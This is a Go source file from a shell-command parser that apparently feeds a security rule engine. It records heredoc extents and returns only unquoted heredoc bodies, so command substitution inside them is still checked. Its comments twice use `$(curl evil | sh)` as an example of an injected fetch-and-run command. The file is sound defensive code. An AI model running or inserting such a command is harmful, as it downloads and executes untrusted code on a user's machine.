package cmdparse

// Heredoc extents, made FIRST-CLASS in the parser (pg2-r2rf3).
//
// splitCompound splits a command body on '\n', so before this pass a heredoc BODY
// was shredded into pseudo-leaves: every line of what is merely DATA became its own
// "command", and prose like `the .git/index is 0 bytes` was handed to the rule chain
// as a command whose executable is `the`. That was masked downstream by
// engine.EvaluateExpression early-returning Abstain on the first HasHeredoc leaf —
// but that early return fired on the FIRST heredoc leaf and DISCARDED any decision an
// earlier leaf had already produced, so `grep <gitmeta> x && cat <<EOF` and
// `cat <<EOF && grep <gitmeta> x` reached different verdicts for the same pair of
// operations. A security decision cannot depend on which side of `&&` a heredoc sits
// on.
//
// The fix is structural: stripHeredocBodies removes each heredoc's body (and its
// terminator line) from the text BEFORE splitCompound ever sees it, and records the
// extent on the owning leaf. Body text therefore reaches neither splitCompound (no
// pseudo-leaves) nor tokenize (no pseudo-ARGS either — the second half of the same
// defect: a body line naming a path would otherwise land in Args and be judged as an
// operand).
//
// QUOTED vs UNQUOTED delimiters are not cosmetic, they decide whether the body is
// executable text:
//
//   - `<<'EOF'` / `<<"EOF"` / `<<\EOF` — ANY quoting of ANY part of the delimiter word
//     makes the body ENTIRELY LITERAL. bash performs no expansion, so a `$(...)` in
//     the body is inert data and MUST NOT be evaluated (evaluating it manufactures
//     false positives out of prose, e.g. a bug report quoting a shell command).
//   - `<<EOF` — the body undergoes parameter expansion AND command substitution, so a
//     `$(curl evil | sh)` in the body genuinely EXECUTES and MUST still be evaluated.
//
// Getting that backwards either misses a real injection or invents a false positive,
// so Quoted is recorded per heredoc and the engine recurses only the unquoted bodies
// (see ParsedCommand.UnquotedHeredocBodies).
type Heredoc struct {
	// Delimiter is the delimiter word with its quoting REMOVED — the text a
	// terminator line must equal.
	Delimiter string
	// Quoted reports that the delimiter word carried quoting, i.e. the body is
	// literal and undergoes NO expansion.
	Quoted bool
	// StripTabs is the `<<-` form: leading TABS are stripped from body lines and,
	// load-bearing here, from the terminator line — so an indented terminator is
	// still recognised and the body extent does not run to end of input.
	StripTabs bool
	// Body is the body text verbatim (the terminator line excluded), exactly as it
	// appeared in the source.
	Body string
	// Terminated reports that a terminator line was found. An UNTERMINATED heredoc
	// swallows the rest of the input as body — the safe direction, since the
	// alternative is shredding those lines back into commands.
	Terminated bool
}

// DELETED, and the deletion is a coverage claim: `isHeredocWordEnd`, `atWordStart`,
// `parseHeredocOperator`, `readHeredocBody`, `heredocSpan`, `scanHeredocs`,
// `stripHeredocBodies`, `StripCommentsPreservingHeredocs` and
// `countHeredocOperators`.
//
// `stripHeredocBodies` is ADR 0039's NAMED INSTANCE of root cause 2 — a pass that
// returns a MODIFIED STRING. Its purest consequence: a leaf's `Raw` was post-strip
// text, so re-parsing it re-derived a heredoc extent that was no longer terminated.
// I12 removes that by making `Raw` the exact SOURCE slice of the owning statement,
// body included, and `FuzzShellParseSeam`'s Raw-reparse invariant is what now owns
// the property `FuzzStripHeredocBodies` used to assert.
//
// `atWordStart` was ADR 0039's UNREPRESENTABLE PREDICATE: a POSITIONAL word-start
// test that had to agree with `splitCompound`'s STATEFUL one, and could not express
// "after a flushed subshell". That disagreement produced the phantom heredoc of
// `(<)#<<0`. There is now ONE word-start notion, the grammar's, so there is no
// second predicate to disagree with the first.
//
// `StripCommentsPreservingHeredocs` existed only because the engine's per-line
// comment strip had to be taught where heredoc bodies were. Under
// KeepComments(true) a comment is a parser fact and a body is a `Redirect.Hdoc`
// node, so neither needs a text pass and the engine strips nothing at all.
//
// The `Heredoc` TYPE and `UnquotedHeredocBodies` are RETAINED: they are the extent
// RECORD the seam populates from `Redirect.Word`/`Redirect.Hdoc` and the engine's
// I2/I3 discriminator reads. They derive no structure from text.

// UnquotedHeredocBodies returns the bodies of this leaf's heredocs whose delimiter
// was UNQUOTED — the bodies bash performs parameter expansion and COMMAND
// SUBSTITUTION on, and therefore the only heredoc text that can execute. The engine
// recurses each through the full rule chain, so `cat <<EOF` with `$(curl evil | sh)`
// in its body is still judged, while the same bytes under `cat <<'EOF'` are literal
// data and are never treated as a command.
func (pc ParsedCommand) UnquotedHeredocBodies() []string {
	var out []string
	for _, hd := range pc.Heredocs {
		if hd.Quoted || hd.Body == "" {
			continue
		}
		out = append(out, hd.Body)
	}
	return out
}
